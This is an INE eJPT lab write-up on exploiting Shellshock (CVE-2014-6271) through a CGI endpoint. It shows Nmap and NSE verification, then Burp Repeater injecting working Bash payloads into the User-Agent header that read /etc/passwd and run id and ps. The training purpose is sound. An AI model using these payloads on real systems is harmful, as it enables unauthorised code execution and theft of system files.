# Shellshock (CVE-2014-6271) - INE eJPT

INE lab demonstrating the Shellshock vulnerability in Bash. The attack targets a CGI endpoint on a web server: Nmap identifies the open port and confirms the vulnerability via NSE, then Burp Suite Repeater is used to inject a payload into the `User-Agent` header, achieving remote code execution through the CGI-to-Bash environment variable chain.

---

## Enumeration

### Network Scanning

```bash
nmap demo.ine.local
```

Open port: 80/tcp - HTTP

### Web Enumeration

Browsing to `http://demo.ine.local` reveals a web application with a CGI script. Reviewing the page source identifies the CGI endpoint: `/gettime.cgi`.

CGI scripts that invoke a Bash backend pass HTTP headers as environment variables - the exact mechanism Shellshock exploits.

---

## Vulnerability Verification

Confirm the target is vulnerable using the Nmap NSE script:

```bash
nmap --script http-shellshock \
  --script-args "http-shellshock.uri=/gettime.cgi" \
  demo.ine.local
```

Result confirms: Bash vulnerable, CGI endpoint exposed, RCE possible.

---

## Exploitation

### How Shellshock Works

Bash versions prior to 4.3 patch incorrectly parse function definitions passed through environment variables. The malformed function definition causes Bash to execute any commands appended after it:

```
() { :; }; <injected command>
```

CGI passes HTTP headers (including `User-Agent`) directly as environment variables, making the header an injection vector.

### Burp Suite - Header Injection

1. Enable FoxyProxy and start Burp Suite with Intercept on
2. Reload the CGI endpoint to capture the request
3. Forward the request to Repeater
4. Replace the `User-Agent` header value with the payload

Payload - read `/etc/passwd`:

```bash
() { :; };echo;echo; /bin/bash -c 'cat /etc/passwd'
```

Send the request. Response body contains the output of `cat /etc/passwd` - RCE confirmed.

### Additional Commands

Check current user context:

```bash
() { :; };echo;echo; /bin/bash -c 'id'
```

Enumerate running processes:

```bash
() { :; };echo;echo; /bin/bash -c 'ps -ef'
```

---

## Key Takeaways

- Shellshock is a parsing vulnerability, not a network protocol weakness. The exploit is a specifically malformed string that Bash misinterprets as a function definition.
- The attack chain is: HTTP request header - CGI - environment variable - Bash execution. Any service that passes attacker-controlled data to Bash via environment variables is a potential vector.
- The `echo;echo;` in the payload before the command is necessary to separate the HTTP headers from the command output in the response body.
- NSE script `http-shellshock` with the correct CGI path is the fastest way to confirm vulnerability before manual exploitation.
- CGI endpoints on any service stack are high-priority targets during web enumeration. Page source review is what revealed the endpoint here.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
